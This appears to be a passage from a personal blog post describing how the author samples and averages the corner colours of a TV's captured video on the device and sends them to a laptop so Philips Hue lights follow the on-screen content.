<p>A perfect little 4K screenshot of the episode of “Halt and Catch Fire” being
played on the TV 🙏</p>

<h3 id="getting-the-lights-to-react-to-the-captured-video">Getting the Lights to React to the Captured Video</h3>

<p>With the image in hand, the final piece of the puzzle is getting the lights to
actually change with the content on the screen. This part is relatively easy
though hard to do in a performant way. My initial prototype captured the entire
screen and beamed it over to my laptop so I could display it full screen there
and just use the regular <a href="https://www.philips-hue.com/en-us/explore-hue/propositions/entertainment/sync-with-pc">Hue Sync</a>
application to test out.</p>

<p>This certainly worked but it was truly slow, sending a raw 4K image across a
local network from the device ran at around 1-2 frames per second. This was far
too slow. While I could have tried using a JPG encoder to make a much smaller
iamge, I figured that it would be a bit too slow to handle too.</p>

<p>The solution I ended up with for now was to capture the corners of the screen
for a faster capture time, average the pixel values on the device for the corners
and then send those over. This roughtly ended up looking like this:</p>

<p>The only hiccup here was figuring out the exact YCbCr color encoding that
the MStar uses, but that was again conveniently provided by the directfb source
code.</p>

<p>Currently the code sends these averaged YCbCr colors of each corner to my laptop
which then shows them the full-screen as a set of boxes for the Hue app to pick
up:</p>

<p><img src="https://blog.ammaraskar.com/images/roku/corner_sampling.png" alt=""/></p>

<p>After I clean up the code, I will open source it. In the future I’m hoping to
integrate it directly with the Hue entertainment API so it can control the
lights directly but for now, enjoy this demo. It runs at a stable 20-30 fps now
so the effect looks great:</p>
